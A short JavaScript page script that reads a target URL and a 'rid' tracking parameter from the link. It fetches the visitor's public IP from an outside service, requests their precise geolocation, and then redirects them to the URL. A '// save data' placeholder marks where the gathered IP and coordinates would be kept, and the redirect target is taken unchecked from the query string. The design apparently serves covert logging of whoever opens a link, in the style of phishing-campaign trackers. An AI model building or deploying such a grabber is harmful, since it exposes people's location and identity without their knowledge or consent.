var url
var rid

var ip
var lat
var long

window.onload = function() {
  grabGeo();
  prepare();
};

function prepare() {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  url = urlParams.get("url")
  rid = urlParams.get("rid")

  console.log("url: " + url);
  console.log("rid: " + rid);

  aggregate();
}

function grabIp() {
  var request = new XMLHttpRequest();
  request.open('GET', 'https://api.ipify.org?format=json', false);
  request.setRequestHeader("Content-type", "application/json");
  request.send(null);

  if (request.status === 200) {
      var obj = JSON.parse(request.responseText);
      ip = obj.ip
  }
}

function grabGeo() {
  var options = {
    enableHighAccuracy: true,
    maximumAge: 0
  };

  function success(pos) {
    lat = pos.coords.latitude;
    long = pos.coords.longitude;

    // save data

    redirect();
  }

  function error(err) {
    console.error("ERR while acquiring data");
    redirect();
  }

  navigator.geolocation.getCurrentPosition(success, error, options);
}

function redirect() {
  window.location.href = url;
}

function aggregate() {
  grabIp();
  grabGeo();
}